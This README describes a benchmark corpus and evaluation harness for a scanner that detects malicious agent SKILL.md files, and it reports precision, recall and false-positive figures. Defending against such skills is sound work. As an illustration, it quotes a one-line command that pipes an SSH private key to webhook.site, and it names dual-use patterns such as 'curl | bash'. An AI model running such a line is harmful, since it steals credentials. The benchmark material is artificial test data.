# ClawVet benchmark corpus

A labeled set of `SKILL.md` fixtures for measuring the scanner, plus the eval
harness (`eval.py`) that turns raw scores into metrics with confidence
intervals.

## Layout

| dir               | label | count | what it is |
|-------------------|:-----:|:-----:|------------|
| `malicious/`      |   1   |  51   | genuinely malicious skills across every threat category |
| `benign/`         |   0   |  30   | clean skills that should never be flagged |
| `hard-negatives/` |   0   |  20   | legitimate skills that look dangerous. they read `~/.aws/credentials`, run `docker exec`, `curl \| bash` an installer, or call `eval` |

`benign/` and `hard-negatives/` are both label 0. They are split so the two
false-positive regimes stay visible. A scanner can flag nothing in `benign/`
and still flag most of `hard-negatives/`, and that gap is the point.

Malicious fixtures are stored base64-encoded as `SKILL.md.b64` so the tree
doesn't trip antivirus. Benign and hard-negative fixtures are plain `SKILL.md`.

`labels.csv` is the ground-truth manifest (`id,dir,label`).

## Why the hard negatives exist

A static scanner catches almost every malicious skill, but it can't tell
`cat ~/.ssh/id_rsa | curl webhook.site` from `cat ~/.ssh/config`. One steals a
key, the other is a normal ssh helper, and the regex sees the same tokens. The
`hard-negatives/` set is that ambiguity on its own. Their false positives are
what the opt-in semantic stage is meant to recover, so report the scanner as
two rows, static alone and static plus semantic, on this same corpus.

Some malicious fixtures such as `hex-payload` are evasion cases a regex scanner
cannot catch, and they stay as they are. A missed detection is real data, not a
fixture to fix.

## Reproducing the numbers

```bash
# score every fixture -> benchmarks/results.csv (id,label,score,dir)
npx tsx benchmarks/scan-all.mjs

# full report at the scanner's warn threshold
python3 benchmarks/eval.py benchmarks/results.csv --threshold 26

# did a change help? McNemar against a saved baseline
python3 benchmarks/eval.py new.csv --compare results.csv
```

`results.csv` is a committed snapshot of the current scanner's scores, so the
numbers below reproduce without a build. Regenerate it with `scan-all.mjs` after
any scanner change.

## Static baseline (threshold 26)

From `eval.py` on the committed `results.csv`.

```
confusion:  TP=50  FP=4  TN=46  FN=1
precision      0.926
recall         0.980
FPR            0.080
F1             0.952
ROC-AUC        0.969
PR-AUC (AP)    0.963
MCC            0.903
95% CI  F1 [0.904, 0.990]   MCC [0.810, 0.980]   PR-AUC [0.906, 0.996]
```

Two scorer changes get most of this over a naive per-match sum. Repeated hits of
one rule count with diminishing returns instead of stacking linearly, and a
context pass downweights a dual-use capability (reads a credential file, runs
`docker exec`, installs a cron job) when the skill has no exfil or remote-exec
sink to go with it. Together they cut the false-positive rate from 0.22 to 0.08
with no loss of recall, because every credential/persistence-based malicious
fixture also carries a sink.

The 4 remaining false positives are all exec or tunnel dual-use that static
rules can't separate from their malicious twins: `js-repl` (`eval`),
`python-runner` (`python -c`), `base64-tool` (decode), `curl-installer`
(`curl | bash`). These are what the opt-in semantic stage is for. Recall misses
one fixture, `hex-payload`, an obfuscated payload a regex can't decode.
